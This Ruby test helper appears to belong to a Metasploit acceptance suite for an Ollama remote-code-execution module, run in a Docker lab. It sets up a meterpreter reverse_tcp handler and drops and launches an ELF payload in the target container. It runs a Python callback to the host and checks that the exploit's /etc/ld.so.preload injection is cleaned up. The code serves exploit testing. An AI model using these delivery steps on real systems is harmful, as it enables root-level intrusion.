# frozen_string_literal: true

require_relative '../laravel/sessions'
require_relative '../ollama_rce/acceptance'

# Calibrate the stock ELF first; keep armed-state reads resident throughout.
module OllamaSessions
  include LaravelSessions
  include OllamaRceTarget

  def laravel_component
    'ollama'
  end

  def laravel_owner
    OllamaRceTarget::OWNER
  end

  def laravel_uid
    0
  end

  def session_families
    { 'linux-x64' => [0, 'linux/x64/meterpreter/reverse_tcp', 'meterpreter'] }
  end

  def session_default_options
    { 'linux-x64' => %w[TARGET PAYLOAD] }
  end

  def session_control_name
    'OllamaSessionControl'
  end

  def session_health_path
    '/api/version'
  end

  def session_owner_options(options)
    # Native pulls take slightly over three seconds on the capped image. Keep
    # the normal HttpClient deadline rather than the shared helper's override.
    options.except('HttpClientTimeout').merge('SRVHOST' => '0.0.0.0', 'SRVPORT' => 4493, 'URIHOST' => @listener_host,
                                              'WRITABLE_DIR' => '/tmp/module-target-ollama/owner')
  end

  def rc_resource_roles
    ['reporting_db']
  end

  def rc_resources(phase)
    ollama_resources(phase)
    super
  end

  def unarmed
    expect(ollama_http('observer', '/snapshot').fetch('preload')).to eq('exists' => false)
  end

  def rc_command(label, role, *arguments, required: true)
    unarmed if role == 'target'
    super
  end

  def file(path)
    return ollama_file(path).slice('exists', 'uid', 'base64') if path.start_with?('/tmp/module-target-ollama/')

    # Reuse the established session proof path. Helpers are allowed only after
    # resident evidence proves the global preload is absent; never while armed.
    expect(path).to match(%r{\A/tmp/module-target-ollama-session-\d+-\d+\z})
    code = "import pathlib,base64,json,sys;p=pathlib.Path(sys.argv[1]);print(json.dumps({'exists':True,'uid':p.stat().st_uid,'base64':base64.b64encode(p.read_bytes()).decode()} if p.exists() else {'exists':False}))"
    output, = rc_command('session-proof-file', 'target', 'python3', '-c', code, path)
    value = JSON.parse(output)
    @rc[:files] << { path: path, value: value }
    rc_save
    value
  end

  def process_state
    ollama_http('observer', '/snapshot').fetch('state')
  end

  def idle
    super
    expect(fetch_listener_open?).to be(false)
    true
  end

  def callback_control
    unarmed
    server = TCPServer.new('0.0.0.0', LaravelSessions::CALLBACK_PORT)
    token = 'ollama-' + Rex::Text.rand_text_alphanumeric(24)
    program = <<~'PYTHON'
      import json, os, socket, sys
      host = socket.gethostbyname('host.docker.internal')
      identity = dict(host=host, token=sys.argv[1], uid=os.geteuid(), pid=os.getpid(), ppid=os.getppid())
      with socket.create_connection((host, int(sys.argv[2])), timeout=8) as peer:
          peer.sendall((json.dumps(identity) + '\n').encode())
          with peer.makefile('rb') as stream:
              assert stream.readline() == ('ACK:' + sys.argv[1] + '\n').encode()
      print(json.dumps(identity))
    PYTHON
    task = Thread.new { Open3.capture3(*session_exec_argv('python3', '-c', program, token, LaravelSessions::CALLBACK_PORT.to_s)) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native Ollama callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => laravel_uid)
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == identity.fetch('pid') }
    expect(process).to include('uid' => '0', 'ppid' => identity.fetch('ppid'), 'birth' => be_a(String))
    connected = state.fetch('connections').select { |row| row.fetch('state') == '01' }.map { |row| row.fetch('inode') }
    expect(connected & process.fetch('connection_inodes')).not_to be_empty
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), output + error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def native_session(family)
    _target, payload, = session_families.fetch(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    path = "/tmp/module-target-ollama/native/stock-#{Process.pid}"
    log_path = path + '-output'
    expect(file(path)).to eq('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;SaltDeploymentSessionControl.executable(job,#{payload.inspect},framework);end")
    attempt[:generated] = generated
    bytes = Base64.strict_decode64(generated.fetch('executable_base64'))
    expect(bytes).to start_with("\x7fELF".b)
    expect(bytes.getbyte(4)).to eq(2)
    expect(bytes.byteslice(18, 2).unpack1('v')).to eq(62)
    unarmed
    command = session_exec_argv('sh', '-c', 'cat > "$1" && chmod 700 "$1" && sha256sum "$1"', 'native-elf', path)
    output, error, status = Open3.capture3(*command, stdin_data: bytes)
    attempt[:install] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(generated.fetch('executable_sha256'))
    expect(file(path)).to eq('exists' => true, 'uid' => 0, 'base64' => generated.fetch('executable_base64'))
    unarmed
    command = session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, path, detached: true)
    output, error, status = Open3.capture3(*command)
    attempt[:launch] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      ollama_remove([path, log_path]) if path
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def use_session(family, attempt, owner)
    metadata = await_session(session_families.fetch(family)[1], owner)
    expect(rc_json('framework.sessions.keys')).to eq([metadata.fetch('id')])
    if owner == laravel_owner
      attempt[:effective_selection] = rc_json('{target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],allow_no_cleanup:active_module.datastore["AllowNoCleanup"],depth:active_module.datastore["DEPTH"]}')
      expect(attempt.fetch(:effective_selection)).to include('target' => 0, 'payload' => 'linux/x64/meterpreter/reverse_tcp', 'allow_no_cleanup' => be_falsey, 'depth' => 14)
      lifecycle = rc_poll(15) do
        events = rc_json('framework.instance_variable_get(:@ollama_lifecycle_events)')
        events if events.any? { |row| row['event'] == 'return' && row['method'] == 'on_new_session' && row['session'] == metadata.fetch('id') }
      end
      current = lifecycle.drop(@rc.fetch(:lifecycle_cursor, 0))
      @rc[:lifecycle_cursor] = lifecycle.length
      events = rc_json('framework.instance_variable_get(:@ollama_events)').drop(@rc.fetch(:event_cursor, 0))
      @rc[:event_cursor] = rc_json('framework.instance_variable_get(:@ollama_events).length')
      attempt[:events] = events
      attempt[:lifecycle] = current
      generated = events.find { |row| row['method'] == 'generate_payload_so' && row['event'] == 'return' }
      delivered = current.find { |row| row['method'] == 'trigger_rce' && row['event'] == 'call' }
      cleaned = current.find { |row| row['method'] == 'on_new_session' && row['event'] == 'return' }
      expect(generated).not_to be_nil
      expect(delivered.fetch('allow_no_cleanup')).to be_falsey
      expect(delivered.fetch('library')).to include('exists' => true, 'uid' => 0, 'base64' => generated.fetch('library_base64'))
      expect(Base64.strict_decode64(delivered.fetch('preload').fetch('base64'))).to eq(delivered.fetch('path') + "\n")
      expect(cleaned.fetch('session')).to eq(metadata.fetch('id'))
      # The constructor already unlinks preload. Mettle's second rm fails for
      # that absent file, so FileDropper retains its name in the retry list.
      expect(cleaned.values_at('dropped_files', 'dropped_dirs')).to eq([['/etc/ld.so.preload'], []])
      expect(cleaned.fetch('library')).to eq('exists' => false)
      expect(ollama_file(delivered.fetch('path'))).to eq('exists' => false)
      expect(ollama_file('/etc/ld.so.preload')).to eq('exists' => false)
      expect(ollama_http('api', '/api/tags').fetch('models')).to eq([])
      attempt[:automatic_cleanup_before_fixture] = true
      rc_save
    end
    super
    state = attempt.fetch(:live_state)
    process = state.fetch('processes').find { |row| row.fetch('pid') == attempt.fetch(:proof).fetch('pid') }
    connections = state.fetch('connections').select { |row| row.fetch('state') == '01' }
    expect(connections.length).to eq(1)
    expect(process.fetch('connection_inodes')).to include(connections.first.fetch('inode'))
    expect(attempt.fetch(:open_reports).select { |row| row['closed_at'].nil? }.map { |row| row.fetch('id') }).to eq([metadata.fetch('db_id')])
    ollama_resources('after-session')
  ensure
    rc_save
  end
end
